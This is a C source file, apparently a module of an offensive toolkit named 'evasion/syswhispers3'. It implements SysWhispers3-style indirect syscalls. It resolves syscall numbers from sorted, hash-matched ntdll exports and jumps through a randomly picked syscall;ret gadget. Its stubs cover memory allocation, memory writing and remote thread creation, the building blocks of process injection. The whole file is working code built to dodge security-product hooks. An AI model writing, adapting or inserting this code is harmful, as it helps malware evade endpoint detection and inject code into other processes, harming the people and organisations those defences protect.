// chunk: evasion/syswhispers3
// depends: (none)
// provides: init_indirect_syscalls, indirect_NtAllocateVirtualMemory, indirect_NtWriteVirtualMemory, indirect_NtCreateThreadEx, indirect_NtQuerySystemInformation
// headers: windows.h
// risk: low
// note: SysWhispers3-style egg hunting — resolves SSNs via sorted Zw* exports, then finds a random syscall;ret gadget in ntdll .text for each call. Unlike other gates that reuse one gadget, this picks a DIFFERENT gadget address each init, making the jump target less predictable.

#ifndef CHUNK_SYSWHISPERS3
#define CHUNK_SYSWHISPERS3

static DWORD ssn_NtAllocateVirtualMemory = 0;
static DWORD ssn_NtWriteVirtualMemory = 0;
static DWORD ssn_NtCreateThreadEx = 0;
static DWORD ssn_NtQuerySystemInformation = 0;
static void *syscall_ret_gadget = NULL;

typedef struct {
    DWORD rva;
    DWORD name_rva;
} sw3_entry_t;

static DWORD sw3_hash(const char *s) {
    DWORD h = 0;
    DWORD ror;
    while (*s) {
        ror = (h >> 13) | (h << 19);
        h = ror + *s++;
    }
    return h;
}

#define SW3_H_NtAllocateVirtualMemory 0xD33BCABDu
#define SW3_H_NtWriteVirtualMemory    0xC5108CC2u
#define SW3_H_NtCreateThreadEx        0x4D1DEB74u
#define SW3_H_NtQuerySystemInformation 0xE4E1CAD6u

static DWORD sw3_resolve_ssn(HMODULE ntdll, DWORD target_hash) {
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return (DWORD)-1;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    sw3_entry_t entries[512];
    DWORD count = 0;

    for (DWORD i = 0; i < exp->NumberOfNames && count < 512; i++) {
        char *name = (char *)(base + names[i]);
        if (name[0] == 'Z' && name[1] == 'w') {
            entries[count].rva = funcs[ords[i]];
            entries[count].name_rva = names[i];
            count++;
        }
    }

    // Insertion sort by RVA
    for (DWORD i = 1; i < count; i++) {
        sw3_entry_t key = entries[i];
        int j = (int)i - 1;
        while (j >= 0 && entries[j].rva > key.rva) {
            entries[j + 1] = entries[j];
            j--;
        }
        entries[j + 1] = key;
    }

    for (DWORD i = 0; i < count; i++) {
        char *zw_name = (char *)(base + entries[i].name_rva);
        // Convert Zw name to Nt for hashing
        char nt_name[128];
        nt_name[0] = 'N'; nt_name[1] = 't';
        int k = 2;
        for (const char *p = zw_name + 2; *p && k < 126; p++)
            nt_name[k++] = *p;
        nt_name[k] = '\0';

        if (sw3_hash(nt_name) == target_hash)
            return i;
    }

    return (DWORD)-1;
}

static void *sw3_find_random_gadget(HMODULE ntdll) {
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    void *gadgets[64];
    DWORD gadget_count = 0;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE *start = base + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;
            for (DWORD j = 0; j < size - 2 && gadget_count < 64; j++) {
                if (start[j] == 0x0F && start[j + 1] == 0x05 && start[j + 2] == 0xC3) {
                    gadgets[gadget_count++] = (void *)(start + j);
                    j += 16;  // Skip ahead to find different gadgets
                }
            }
        }
    }

    if (gadget_count == 0) return NULL;

    // Pick a pseudo-random gadget based on TSC
    DWORD seed = GetTickCount();
    return gadgets[seed % gadget_count];
}

static int init_indirect_syscalls(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    ssn_NtAllocateVirtualMemory = sw3_resolve_ssn(ntdll, SW3_H_NtAllocateVirtualMemory);
    ssn_NtWriteVirtualMemory    = sw3_resolve_ssn(ntdll, SW3_H_NtWriteVirtualMemory);
    ssn_NtCreateThreadEx        = sw3_resolve_ssn(ntdll, SW3_H_NtCreateThreadEx);
    ssn_NtQuerySystemInformation = sw3_resolve_ssn(ntdll, SW3_H_NtQuerySystemInformation);
    syscall_ret_gadget = sw3_find_random_gadget(ntdll);

    return (ssn_NtAllocateVirtualMemory != (DWORD)-1 &&
            ssn_NtWriteVirtualMemory != (DWORD)-1 &&
            ssn_NtCreateThreadEx != (DWORD)-1 &&
            ssn_NtQuerySystemInformation != (DWORD)-1 &&
            syscall_ret_gadget != NULL) ? 1 : 0;
}

__attribute__((naked))
static NTSTATUS indirect_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtAllocateVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtWriteVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtCreateThreadEx(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtQuerySystemInformation(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtQuerySystemInformation(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

#endif
